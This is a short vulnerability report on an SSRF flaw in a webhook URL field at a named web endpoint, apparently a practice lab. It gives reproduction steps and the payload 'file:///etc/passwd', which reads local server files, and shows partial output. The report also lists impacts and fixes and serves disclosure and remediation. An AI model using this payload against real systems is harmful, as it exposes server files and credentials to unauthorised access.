## Title

Server-Side Request Forgery (SSRF) Leading to Local File Read via `Webhook Endpoint URL`

## Vulnerability Type

Server-Side Request Forgery (SSRF)

## Summary

The application accepts user-controlled input in the Webhook Endpoint URL field and makes server-side requests without properly validating the supplied URI scheme.

By supplying a `file://` URI, the backend server attempts to access a local file and returns its contents in the response.

The vulnerability was confirmed by reading the `/etc/passwd` file from the server.

## Vulnerable Endpoint

```http
https://kzlabs.in/601.php
```

### Vulnerable Parameter

```http
Webhook Endpoint URL
```

## Steps to Reproduce

1. Navigate to the Webhooks page.
2. Enter the following value in the **Webhook Endpoint URL** field:

```text
file:///etc/passwd
```

3. Click **Send Test Event**.

4. Observe that the contents of `/etc/passwd` are returned in the response.

5. This confirms that the application processes arbitrary URI schemes and allows access to local files on the server.

## Payload Used

```text
file:///etc/passwd
```

## Proof of Concept

The application reads and returns the contents of the local file:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Impact

* Disclosure of sensitive server files
* Information leakage about the underlying operating system
* Exposure of configuration files and credentials
* Potential chaining into further attacks against internal infrastructure

## Recommendations for Fix

* Allow only `http://` and `https://` URL schemes
* Block access to `file://` and other non-HTTP protocols
* Implement strict server-side URL validation
* Restrict outbound requests to approved destinations only
